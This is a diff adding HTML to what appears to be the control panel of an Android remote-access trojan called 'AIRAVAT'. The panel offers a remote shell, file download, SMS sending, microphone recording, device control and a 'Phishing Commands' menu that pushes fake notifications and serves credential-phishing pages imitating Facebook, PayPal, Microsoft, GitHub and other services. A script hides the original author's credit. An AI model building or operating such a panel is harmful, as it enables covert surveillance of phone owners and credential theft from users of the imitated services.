+                <li><a download="" id="btdwn" target="_blank" href="hh">Download File</a><br>
+            </ul>
+
+            <br>
+
+            <span class="span"
+                onclick='this.parentElement.style.display="none";setdatcmd("cd",var32.substr(0,var32.lastIndexOf("/")),"",respov);'>×</span>
+        </div>
+
+
+        <div id="viewers">
+            <iframe id="vieweri"
+                src="data:text/html,<h4 style='color:green' > Getting File for preview....</h4>"></iframe>
+            <a href="#" id="downlo" target="_blank" download="file.html">
+                <div class="down"> <svg fill="white" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+                        viewBox="0 0 24 24">
+                        <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z" />
+                    </svg> </div>
+            </a>
+        </div>
+
+
+        <div id="shellcmd">
+            <div id="shelldata">AIRAVAT Shell<br><sub>(some root commands may not work properly)</sub> </div>
+            <input type="text" onkeyup="shellcm(this)" id="shellcmdd" placeholder="Enter Your Command Here_" />
+        </div>
+
+
+
+        <div id="notikey" style="display:none;"></div>
+
+        <div id="toastdiv">
+            <br>
+            <h3>Toast</h3>
+            <br>
+            <textarea type="text" id="toastcmd" placeholder="Type Your Message Here" /></textarea>
+            <br><br><button onclick="toastexc()">Executar</button>
+        </div>
+
+
+        <div id="diamain" onclick="this.style.display='none';">
+            <div class="diachild">
+                <h3 style="color:white">Response</h3><br>
+                <p id="diatext" id="diatext">This is response Text bsdk </p>
+                <br>
+                <button>OK</button>
+            </div>
+        </div>
+
+
+
+        <div id="pvtt">
+            <h3 style="color: white">FUN COMMANDS</h3><br><br>
+            <div id="fmc1">
+                <div id="plmc">
+                    <h4>Play Music</h4><br>
+                    <input type="text" id="musiccmd" placeholder="Enter Direct .mp3 link">
+                    <br><button onclick="playmus()">Execute</button>
+                    <br><br>
+                    <hr><br>
+                </div>
+                <div id="vibradev">
+                    <h4>Vibrate Device</h4><br>
+                    <input type="text" id="vibratecmd" placeholder="Enter No. of Seconds">
+                    <br><button onclick="vibra()">Execute</button>
+                    <br><br>
+                    <hr><br>
+                </div>
+                <div id="ttsdev">
+                    <h4>Text To Speech</h4><br>
+                    <input type="text" id="ttscmd" placeholder="Enter Your Text Message">
+                    <br><button onclick="ttsf()">Execute</button>
+                    <br>
+                </div>
+            </div>
+            <div id="fmc2">
+                <div id="tonofff">
+                    <h4>Turn On/Off Torch</h4><br>
+                    <button onclick="tont()">Turn On</button>
+                    <button style="margin-left:10px;" onclick="tofft()">Turn Off</button>
+                    <br><br>
+                    <hr><br>
+                </div>
+                <div id="oppweb">
+                    <h4>Open URL</h4><br>
+                    <input type="text" id="opwebcmd" placeholder="Enter Your URL including http://">
+                    <br><button onclick="opwebl()">Execute</button>
+                </div>
+            </div>
+        </div>
+
+
+
+        <div id="senddm">
+            <h4 style="color: white">Send SMS</h4><br><br>
+            TO:<input type="text" id="smsnumber" placeholder="Enter Mobile Number"><br><br>
+            Message:<br><br><textarea id="smscontent" placeholder="Enter Message Content"></textarea>
+            <br><br>
+            <center><button onclick="sendsms()">Send SMS</button></center>
+        </div>
+
+
+
+        <div id="wallpaperdiv"><br>
+            <h3 style="color: white">Select Wallpaper</h3><br><br>
+            <div class="wallimg">
+                <img src="./img/wall1.png" onclick="selectimg(this,0)" id="selectedimg">
+                <img src="./img/wall2.png" onclick="selectimg(this,1)">
+                <img src="./img/wall3.png" onclick="selectimg(this,2)">
+            </div>
+            <br>
+            <center><button onclick="setwalls()">Set Wallpaper</button></center>
+        </div>
+
+
+        <div id="micrec">
+            <br>
+            <h3>Record</h3>
+            <br>
+            <input type="text" id="recval" placeholder="Record For x Second" />
+            <br><button class="btn" onclick="recordvoice()">Record Mic</button>
+            <br>
+            <hr>
+            <br>
+            <br>
+            <h3>Recordings</h3><br>
+            <div id="showrecs">
+            </div>
+
+        </div>
+
+
+
+        <div id="showphishj">
+            <br>
+            <h3>Phishing Commands</h3><br><br>
+            <input type="text" id="nshpih" placeholder="Enter Notification Title" /><br>
+            <br>
+            <hr>
+            <select onchange="iojh()" id="lshpih">
+                <option value='0'>dropbox3.png</option>
+                <option value='1'>facebook2.png</option>
+                <option value='2'>facebook5.png</option>
+                <option value='3'>free_fire3.png</option>
+                <option value='4'>github1.png</option>
+                <option value='5'>instagram1.png</option>
+                <option value='6'>linkedin1.png</option>
+                <option value='7'>messenger1.png</option>
+                <option value='8'>microsoft1.png</option>
+                <option value='9'>netflix1.png</option>
+                <option value='10'>paypal2.png</option>
+                <option value='11'>protonmail1.png</option>
+                <option value='12'>pubg2.png</option>
+                <option value='13'>snapchat1.png</option>
+                <option value='14'>tumblir1.png</option>
+                <option value='15'>twitter1.png</option>
+                <option value='16'>wordpress1.png</option>
+                <option value='17'>yahoo1.png</option>
+
+            </select>
+            <img src="./imgg/dropbox3.png" id="hion" style="max-height:60px;max-width:60px;">
+            <br><br>
+            <!--jjjwjjw-->
+            <center>
+                <select id="phpage">
+                    <option value="dropbox.html">
+
+                        dropbox.html
+                    </option>
+                    <option value="facebook_desktop_homepage.html">
+
+                        facebook_desktop_homepage.html
+                    </option>
+                    <option value="facebook_desktop_static.html">
+
+                        facebook_desktop_static.html
+                    </option>
+                    <option value="facebook_mobile.html">
+
+                        facebook_mobile.html
+                    </option>
+                    <option value="facebook_mobile_fake_security.html">
+
+                        facebook_mobile_fake_security.html
+                    </option>
+                    <option value="garena_free_fire.html">
+
+                        garena_free_fire.html
+                    </option>
+                    <option value="github.html">
+
+                        github.html
+                    </option>
+                    <option value="instagram.html">
+
+                        instagram.html
+                    </option>
+                    <option value="linkedin.html">
+
+                        linkedin.html
+                    </option>
+                    <option value="messenger.html">
+
+                        messenger.html
+                    </option>
+                    <option value="microsoft.html">
+
+                        microsoft.html
+                    </option>
+                    <option value="netflix.html">
+
+                        netflix.html
+                    </option>
+                    <option value="paypal.html">
+
+                        paypal.html
+                    </option>
+                    <option value="protonmail.html">
+
+                        protonmail.html
+                    </option>
+                    <option value="pubg.html">
+
+                        pubg.html
+                    </option>
+                    <option value="snapchat.html">
+
+
+                        snapchat.html
+                    </option>
+                    <option value="tumblr.html">
+
+                        tumblr.html
+                    </option>
+                    <option value="twitter_desktop.html">
+
+                        twitter_desktop.html
+                    </option>
+                    <option value="twitter_mobile.html">
+
+                        twitter_mobile.html
+                    </option>
+                    <option value="wordpress.html">
+
+                        wordpress.html
+                    </option>
+                    <option value="yahoo.html">
+
+                        yahoo.html
+                    </option>
+                </select>
+                <button onclick="execphish()"> Execute</button>
+            </center>
+            <br>
+            <hr>
+            <br>
+            <input type="text" id="shpih" placeholder="Enter Your Link" />
+            <br><button class="btn" onclick="execphish2()">Execute</button>
+        </div>
+
+    </div>
+    <script>
+        //oculta o © Prateek Chaubey do tophead
+        document.addEventListener("DOMContentLoaded", function () {
+            var divs = document.querySelectorAll('div');
+
+            divs.forEach(function (div) {
+                if (div.textContent.includes("© Prateek Chaubey")) {
+                    div.classList.add('PrateekChaubey');
+                }
+            });
+        });
+    </script>
+    <script type="text/javascript" src="./script.js"></script>
+    <style>
+        img[alt*="www.000webhost.com"],
+        .disclaimer {
+            display: none
+        }
+    </style>
 </body>
+
 </html>
